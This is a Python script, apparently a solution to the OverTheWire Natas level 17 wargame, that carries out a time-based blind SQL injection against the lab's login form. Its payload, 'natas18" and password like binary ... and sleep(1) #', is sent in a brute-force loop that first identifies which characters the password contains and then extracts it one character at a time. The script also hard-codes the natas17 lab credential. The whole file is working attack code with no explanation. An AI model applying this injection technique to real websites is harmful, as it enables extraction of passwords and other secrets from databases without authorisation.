#!/usr/bin/env python3
import requests, string, datetime

auth = ("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
filteredchars = ''
pwd = ''

for c in string.printable:
    r = requests.post('http://natas17.natas.labs.overthewire.org/', data={'username': 'natas18" and password like binary "%'+c+'%" and sleep(1) #'}, auth=auth)
    if r.elapsed.seconds >= 1:
        filteredchars += c
        print(filteredchars)

#filteredchars = '047dghjlmpqsvwxyCDFIKOPR%_'

for i in range(32):
    for c in filteredchars:
        r = requests.post('http://natas17.natas.labs.overthewire.org/', data={'username': 'natas18" and password like binary "'+pwd+c+'%" and sleep(1) #'}, auth=auth)
        if r.elapsed.seconds >= 1:
            pwd += c
            print(pwd)
            break

